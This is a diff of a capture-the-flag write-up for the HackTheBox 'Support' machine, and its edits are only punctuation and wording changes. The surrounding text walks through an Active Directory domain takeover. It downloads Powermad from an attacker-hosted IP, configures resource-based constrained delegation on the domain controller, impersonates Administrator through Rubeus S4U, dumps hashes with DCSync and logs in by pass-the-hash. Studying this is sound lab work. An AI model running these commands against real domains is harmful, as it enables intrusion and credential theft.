@@ -274,7 +274,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-`support` holds `SeMachineAccountPrivilege`, meaning it can create new computer accounts in the domain (subject to the default `ms-DS-MachineAccountQuota` of 10) — this becomes relevant for the delegation attack below.
+`support` holds `SeMachineAccountPrivilege`, meaning it can create new computer accounts in the domain (subject to the default `ms-DS-MachineAccountQuota` of 10), this becomes relevant for the delegation attack shown below.
 
 ### BloodHound Analysis
 
@@ -303,7 +303,7 @@ INFO: Querying computer: dc.support.htb
 INFO: Done in 00M 07S
 ```
 
-After ingesting the JSON output into BloodHound, running Pathfinding from `SUPPORT@SUPPORT.HTB` to `ADMINISTRATOR@SUPPORT.HTB` reveals a short, direct escalation path:
+After ingesting the JSON output into BloodHound, running Pathfinding from `SUPPORT@SUPPORT.HTB` to `ADMINISTRATOR@SUPPORT.HTB` reveals a direct escalation path:
 
 ![](./screens/1.png)
 
@@ -311,13 +311,13 @@ After ingesting the JSON output into BloodHound, running Pathfinding from `SUPPO
 SUPPORT@SUPPORT.HTB --MemberOf--> SHARED SUPPORT ACCOUNTS --GenericAll--> DC.SUPPORT.HTB --CoerceToTGT / DCSync--> SUPPORT.HTB --Contains--> USERS@SUPPORT.HTB --Contains--> ADMINISTRATOR@SUPPORT.HTB
 ```
 
-`support` is a member of `Shared Support Accounts`, and that group holds `GenericAll` (full control) directly over `DC.SUPPORT.HTB` — the Domain Controller's own computer object. `GenericAll` grants the ability to write to every attribute of the target object, including security-sensitive ones such as `msDS-AllowedToActOnBehalfOfOtherIdentity` (used for Resource-Based Constrained Delegation) or `msDS-KeyCredentialLink` (used for Shadow Credentials attacks). Because a Domain Controller's machine account is inherently a highly privileged principal — it is a member of the `Domain Controllers` group and holds the replication rights needed to perform a `DCSync` — full control over that single object is functionally equivalent to compromising the domain itself. This is why BloodHound draws both a `CoerceToTGT` and a `DCSync` edge straight from the DC's computer object to the domain node: whoever controls `DC$` can obtain tickets and abuse the DC's own replication privileges.
+`support` is a member of `Shared Support Accounts`, and that group holds `GenericAll` (full control) directly over `DC.SUPPORT.HTB`, which is the Domain Controller's own computer object. `GenericAll` grants the ability to write to every attribute of the target object, including security-sensitive ones such as `msDS-AllowedToActOnBehalfOfOtherIdentity` (used for Resource-Based Constrained Delegation) or `msDS-KeyCredentialLink` (used for Shadow Credentials attacks). Because a Domain Controller's machine account is inherently a highly privileged principal  (it is a member of the `Domain Controllers` group and holds the replication rights needed to perform a `DCSync`) full control over that single object is functionally equivalent to compromising the domain itself. This is why BloodHound draws both a `CoerceToTGT` and a `DCSync` edge straight from the DC's computer object to the domain node: whoever controls `DC$` can obtain tickets and abuse the DC's own replication privileges.
 
 ### Exploitation
 
 #### 1. Create an attacker-controlled machine account
 
-Since `support` can create computer accounts (`SeMachineAccountPrivilege` / default `MachineAccountQuota`), Powermad is used to add a new machine account, `attackersystem`, with a known password:
+Since `support` can create computer accounts (`SeMachineAccountPrivilege` / default `MachineAccountQuota`), Powermad is used to add a new machine account (`attackersystem`), with a known password:
 
 ```
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
@@ -367,7 +367,7 @@ SamAccountName    : attackersystem$
 
 #### 2. Configure Resource-Based Constrained Delegation on the DC
 
-`GenericAll` over `DC.SUPPORT.HTB` grants write access to the DC object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute — the attribute that controls **Resource-Based Constrained Delegation (RBCD)**. Setting it to a security descriptor that grants `attackersystem$` the right to delegate authenticates the newly-created computer as a trusted front-end for the DC, meaning it will be allowed to request Kerberos service tickets _on behalf of any other user_ against the DC:
+`GenericAll` over `DC.SUPPORT.HTB` grants write access to the DC object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, the attribute that controls **Resource-Based Constrained Delegation (RBCD)**. Setting it to a security descriptor that grants `attackersystem$` the right to delegate authenticates the newly-created computer as a trusted front-end for the DC, meaning it will be allowed to request Kerberos service tickets on behalf of any other user against the DC:
 
 ```
 $ComputerSid = (Get-DomainComputer attackersystem -Properties objectsid).objectsid
@@ -377,7 +377,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}
 ```
 
-This step is what makes the following Rubeus S4U chain against the DC succeed — without it, the DC would reject the delegated service ticket request.
+This step is what makes the following Rubeus S4U chain against the DC succeed, without it the DC would reject the delegated service ticket request.
 
 #### 3. Abuse S4U2Self / S4U2Proxy to impersonate Administrator
 
@@ -397,7 +397,7 @@ Rubeus is uploaded and used to compute the RC4 (NTLM) hash of `attackersystem`'s
 
 Rubeus' `s4u` action then chains the two extensions of the Kerberos protocol that make constrained/resource-based delegation possible:
 
-- **S4U2Self**: `attackersystem$` requests, on its own behalf, a forwardable service ticket _for itself_ naming `administrator` as the client. Any service account can request this for an arbitrary user without knowing that user's credentials — it is designed for front-end services that have already authenticated a user through another mechanism.
+- **S4U2Self**: `attackersystem$` requests, on its own behalf, a forwardable service ticket _for itself_ naming `administrator` as the client. Any service account can request this for an arbitrary user without knowing that user's credentials.
 - **S4U2Proxy**: using that self-referential ticket, `attackersystem$` requests a service ticket for the target SPN (`cifs/dc.support.htb`) _impersonating_ `administrator`. The DC only honors this request because of the RBCD entry configured in step 2, which explicitly lists `attackersystem$` as trusted to delegate to it.
 
 ```
@@ -440,7 +440,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 #### 4. DCSync
 
-A ticket for `cifs/dc.support.htb` issued in `administrator`'s name grants an authenticated SMB/RPC session on the DC as `Administrator`. `secretsdump` uses that Kerberos session (`-k -no-pass`) to reach the DC's `DRSUAPI` interface and invoke `DRSGetNCChanges` — the same replication call a real secondary Domain Controller uses to sync its database — to pull password material directly out of the domain's NTDS store without ever touching disk:
+A ticket for `cifs/dc.support.htb` issued in `administrator`'s name grants an authenticated SMB/RPC session on the DC as `Administrator`. `secretsdump` uses that Kerberos session (`-k -no-pass`) to reach the DC's `DRSUAPI` interface and invoke `DRSGetNCChanges`to pull hashes directly out of the domain's NTDS store without ever touching disk:
 
 ```
 impacket-secretsdump -k -no-pass -dc-ip 10.129.50.211 support.htb/administrator@dc.support.htb -just-dc-user Administrator
@@ -460,7 +460,7 @@ NTLM hash recovered: `Administrator:bb06cbc02b39abeddd1335bc30b19e26`
 
 #### 5. Pass-the-Hash
 
-The recovered NTLM hash is used directly for authentication (no cracking required) to obtain a fully privileged WinRM session:
+The recovered NTLM hash is used directly for authentication to obtain a fully privileged WinRM session:
 
 ```
 evil-winrm -i 10.129.50.211 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
@@ -469,8 +469,6 @@ Evil-WinRM shell v3.7
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 support\administrator
 ```
-
----
 
 ## Root Flag
 
